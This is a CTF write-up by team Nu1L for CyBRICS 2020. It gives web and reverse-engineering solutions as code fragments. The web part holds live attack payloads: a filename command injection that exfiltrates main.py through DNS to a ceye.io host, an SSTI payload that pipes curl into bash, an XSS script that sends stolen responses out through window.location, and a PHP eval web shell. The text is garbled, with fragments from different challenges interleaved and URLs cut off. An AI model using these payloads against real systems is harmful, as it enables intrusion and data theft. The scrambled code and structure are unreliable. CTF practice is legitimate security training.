CyBRICS CTF By Nu1L
Author:Nu1L
CyBRICS CTF By Nu1L
WEB
Hunt
Developer's Laptop
Gif2png
Woc
RE
Hide and Seek
Baby Rev
Polyglot
NetWork
XCorp
Google Cloud
rebyC
CatGirl Breach
Quiz
Hellish Reverse
Cyber
Serial
Too Secure
Broken Invitation
CTB
Pwnogram
DockEsc
Forensic
Krevedka
Keyshooter
WEB
Hunt
flag
Developer's Laptop
http://prod.free-design-feedback-cybrics2020.ctf.su/
var http = new XMLHttpRequest();
var url = '';
Gif2png
filename="sites'|curl ack.x$(cat main.py | head -n 20| base64 | cut -c 41-
50).xxx.ceye.io|echo'.gif"
Woc
var payload = "{{[].__class__.__base__.__subclasses__()
[132].__init__.__globals__['system']('curl  | 
bash')}}";
var params = 
"url=http://ctf2020.nu1l.com&score=11%25&feedback=a"+escape(payload)+"b";
http.open('POST', url, true);
http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
http.onreadystatechange = function() {
    if(http.readyState == 4 && http.status == 200) {
       var res1 = http.responseText;
       var getp = res1.match('(\\\\?name\\\\=[^\\\\"]*)')[1];
       var http2 = new XMLHttpRequest();
       var url2 = '
       http2.open('GET',url2,true);
       http2.onreadystatechange = function() {
         if(http2.readyState == 4) {
          var a =http2.responseText;
          var b = btoa(a);
          window.location=""+b;
         }
       }
       http2.send();
    }
}
http.send(params);
*/));
@eval($_POST[x]);
?>
$requiredBlocks = [
            'id="back"',
            'id="field" name="field"',
            'id="digit0"',
            'id="digit1"',
            'id="digit2"',
            'id="digit3"',
            'id="digit4"',
            'id="digit5"',
 share
 /calcs/f6fdffe48c908deb/056f35d6-6102-4ed3-a369-0642877253be.php
 POST x=system('cat /flag');  
RE
Hide and Seek
main  flag  Mathematica 
cybrics{HI_this_is_fake_flag}
 start stdin  cybrics{HI_this_is_fake_flag} 
 syscall open  ./.realflag  32 bytes  realflag len(realflag) == 32
http://www.chronox.de/crypto-API/crypto/userspace-if.html
https://github.com/nibrunie/af_alg-examples/blob/master/examples/stream_hash.c
 linux  crypto API hash sha1 fake flag  hash skcipher
cbc(aes)hash sha1  0x10  cbc(aes)  key realflag 
            'id="digit6"',
            'id="digit7"',
            'id="digit8"',
            'id="digit9"',
            'id="plus"',
            'id="equals"',
        ];
POST /?p=calc&template=d4c9e87e-9ac8-4a2f-b280-77b0a8e9690d
field=1/*&share=1
import hashlib
from binascii import unhexlify
from Crypto.Cipher import AES
def main():
    fake_flag = 'cybrics{HI_this_is_fake_flag}'
    v5 = [0] * 16
    v6 = [0] * 16
    v5[0] = -66
    v5[1] = 67
    v5[2] = 26
    v5[3] = 58
    v5[4] = 26
    v5[5] = -57
Baby Rev
    v5[6] = -109
    v5[7] = -18
    v5[8] = 90
    v5[9] = 127
    v5[10] = 119
    v5[11] = 60
    v5[12] = 110
    v5[13] = 81
    v5[14] = 12
    v5[15] = 32
    v6[0] = -20
    v6[1] = 123
    v6[2] = -121
    v6[3] = 44
    v6[4] = -51
    v6[5] = -125
    v6[6] = 61
    v6[7] = -86
    v6[8] = -106
    v6[9] = -78
    v6[10] = 99
    v6[11] = -68
    v6[12] = 33
    v6[13] = 98
    v6[14] = -108
    v6[15] = 66
    enc = v5 + v6
    for i in range(32):
        enc[i] &= 0xff
    enc = bytearray(enc)
    hash_object = hashlib.sha1(fake_flag.encode())
    sha1_hash = unhexlify(hash_object.hexdigest())
    key = sha1_hash[:16]
    iv = 16 * b'\\x00'
    encryptor = AES.new(key, AES.MODE_CBC, IV=iv)
    flag = encryptor.decrypt(enc)
    print(flag.decode())
if __name__ == '__main__':
    main()
Polyglot
C
C++
secret = 
[92,0,74,66,116,77,126,69,17,17,102,126,69,79,97,126,18,76,17,98,16,77,18,86,9
0,82,66,72,83,67,88,66]
print(len(secret))
a = [chr(c^33) for c in secret]
print(''.join(a[::-1]))
#include 
template 
struct t1 {
        enum { value = b + t1::value };
};
template 
struct t1 {
        enum { value = 0 };
};
template 
struct t2 {
        enum { value = 1 + t2::value };
};
template 
struct t2 {
        enum { value = 1 + t2::value };
};
template<>
struct t2{
    enum { value = 0};
};
void decode(unsigned char *data, unsigned int val){
    unsigned int *ptr = reinterpret_cast(data);
    while (*ptr != 0) {
        *ptr = *ptr ^ val;
        val = (val ^ (val << 1)) ^ 0xc2154216;
        ptr += 1;
    }
}
unsigned char flagged[] = 
{5,78,186,165,208,83,107,233,137,90,173,22,11,55,64,102,120,96,164,86,86,40,53
,48,46,240,191,79,163,147,87,144,13,54,47,105,205,251,163,168,220,241,45,203,1
05,83,176,71,111,62,70,221,93,16,218,44,96,189,187,173,165,84,27,170,76,77,204
,37,199,84,203,33,253,32,19,206,38,29,99,160,69,81,157,157,124,126,68,141,97,1
80,138,16,220,221,201,196,76,32,74,137,130,231,10,157,149,163,144,254,60,61,21
4,154,60,50,81,45,18,84,166,167,37,170,234,206,184,0,133,10,102,46,192,234,130
,7,107,251,158,117,171,10,98,88,109,81,60,108,172,24,87,63,125,6,31,246,143,77
,179,162,107,181,102,100,104,42,130,237,169,131,158,180,52,135,59,16,165,82,10
8,119,21,144,113,27,219,101,20,167,164,166,254,65,26,225,15,76,216,38,214,11,2
39,17,208,10,19,206,38,29,96,208,60,37,245,242,18,109,74,149,96,181,139,61,246
,221,201,196,76,100,15,207,130,190,72,254,250,241,152,247,38,16,252,154,60,50,
81,45,18,84,166,245,96,254,191,156,246,0,149,39,76,3,234,234,130,7,45,243,175,
73,167,1,99,19,46,3,67,110,181,25,92,33,42,56,50,242,131,70,163,147,64,148,97,
78,104,42,130,174,237,252,208,241,99,135,38,16,241,11,60,50,70,158,18,84,159,3
2,96,254,244,227,246,0,72,232,0,76,206,41,206,84,206,22,250,10,19,206,38,29,96
,208,60,37,245,242,18,109,74,149,96,181,139,61,246,221,201,196,76,100,15,207,1
30,174,85,195,194,229,148,218,12,16,252,154,60,50,81,45,18,84,166,245,96,254,1
91,156,246,0,149,39,76,3,234,234,130,7,107,189,208,10,174,11,89,94,34,8,121,43
,161,25,109,43,63,56,39,230,204,36,220,221,20,152,76,100,104,42,130,174,237,25
2,208,241,99,135,38,16,241,11,60,50,70,158,18,84,159,32,96,254,183,172,178,69,
68,139,102,3,141,104,130,7,194,59,208,10,19,206,38,29,96,208,60,37,245,242,18,
109,74,149,96,181,139,61,246,221,138,139,2,55,91,156,142,131,110,211,208,241,1
52,247,38,16,252,154,60,50,81,45,18,84,166,245,96,254,191,156,246,0,149,39,76,
3,234,234,204,70,38,248,131,6,197,111,38,29,109,76,60,37,226,86,18,109,115,121
,96,181,192,9,246,221,20,152,76,100,104,42,130,174,237,252,208,165,54,215,106,
85,249,112,62,100,67,218,16,84,217,111,50,254,189,227,191,78,72,244,13,77,202,
45,138,73,142,116,147,75,95,157,47,96,105,220,17,15,245,242,18,109,74,149,96,1
81,139,61,246,221,201,196,76,100,15,207,130,174,68,211,208,241,152,247,38,16,2